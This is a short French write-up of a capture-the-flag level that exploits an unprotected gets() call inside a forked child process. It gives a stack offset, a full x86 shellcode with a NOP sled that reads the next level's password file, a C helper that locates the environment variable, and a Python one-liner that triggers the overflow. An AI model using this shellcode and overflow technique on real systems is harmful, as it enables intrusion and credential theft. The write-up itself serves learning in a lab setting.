En Decompilant le programe on ce rend qu'on que l'on a un __fork__ la fonction __gets__ non proteger dedans. 

Nous allons donc utilise cette faille pour executer un shell code.

en utilisant __GDB__ avec __set follow-fork-mode child__ qui nous permet de check ce qui ce passe dans l'enfant du fork.

On arrive a obtenir un offset de ==156==

Ensuite il faut creer une variable d'enviroment pour notre shell code:

```bash
 export SHELLCODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
```


shellcode qui execute un __cat /home/users/level05/.pass__

Ensuite avec un petit programe on viens recup l'adresse de la variable d'environement:

```c
  #include <stdio.h>
  #include <stdlib.h>

  int main(int argc, char** argv)
  {
    printf("env address at %p\n", getenv(argv[1]));
    return (0);
  }
```

Avec tout ca on créée un one liner python pour executer notre shellcode dans le programe:

> python -c "print '\x90' * 156 + [address shellcode]" | ./level04

On obtient donc le flag.
